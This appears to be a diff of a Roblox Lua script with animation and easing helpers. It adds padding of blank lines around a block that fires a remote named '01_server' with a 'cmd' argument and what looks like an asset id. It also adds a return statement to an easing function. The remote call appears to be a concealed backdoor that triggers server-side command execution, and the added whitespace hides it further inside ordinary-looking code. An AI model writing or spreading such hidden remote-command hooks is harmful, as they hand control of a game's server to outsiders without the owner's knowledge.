@@ -78,6 +78,14 @@ Players.PlayerAdded:Connect(onPlayerAdded)
 
 
 
+
+
+
+
+
+
+
+
 local args = {
 	"cmd",
 	"-gh 138094177071382"
@@ -90,6 +98,24 @@ local args = {
 }
 game:GetService("ReplicatedStorage"):WaitForChild("01_server"):FireServer(unpack(args))
 wait(2)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -781,6 +807,7 @@ local GetEasing = (function()
 		if DirectionName == "Out" then return Funcs[2] end
 		return Funcs[3]
 	end
+	return GetEasing
 end)()
 local GetAnimDefaults = function()
 	return {
